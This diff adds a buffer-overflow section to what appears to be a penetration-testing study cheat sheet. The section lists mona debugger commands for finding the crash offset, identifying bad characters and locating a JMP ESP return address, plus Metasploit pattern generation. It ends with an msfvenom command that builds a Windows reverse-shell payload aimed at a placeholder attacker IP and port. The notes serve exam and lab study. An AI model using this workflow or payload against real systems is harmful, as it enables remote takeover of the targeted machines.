@@ -371,6 +371,56 @@
     * https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
 
 
+## Buffer Overflow machine
+
+Don't forget to try nc to the vulnerable service first! You need to find out the `prefix` variable.
+
+### Mona commands
+
+* Set configuration folder:
+    ```
+    !mona config -set workingfolder c:\mona\%p
+    ```
+
+* Finding offset (application crashed):
+    ```
+    !mona findmsp -distance <same value used on pattern_create.rb>
+    ```
+    Look for this line: **EIP contains normal pattern : ... (offset <THE_VALUE_YOU_WANT>)**. This value should be copied on `offset` variable;
+
+* Generate bytearray with badcodes:
+    ```
+    !mona bytearray -cpb "\x00..."
+    ```
+
+* Compare bytearray file with Stack:
+    ```
+    !mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>
+    ```
+
+* Find jump point without badchars:
+    ```
+    !mona jmp -r esp -cpb "\x00..."
+    ```
+    **Go to 'Window > Log Data' and get one of all available address.** This value should be copied on `retn` variable (inverse)
+
+
+### Metasploit
+
+* Generate pattern:
+    ```
+    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <number found on fuzzer more ~400 bytes>
+    ```
+
+* Generate payload:
+    ```
+    msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00..." -f py -v <output variable name>
+    ```
+
+
+
+
+
 ### References
 
 * Payload all the things: https://github.com/swisskyrepo/PayloadsAllTheThings
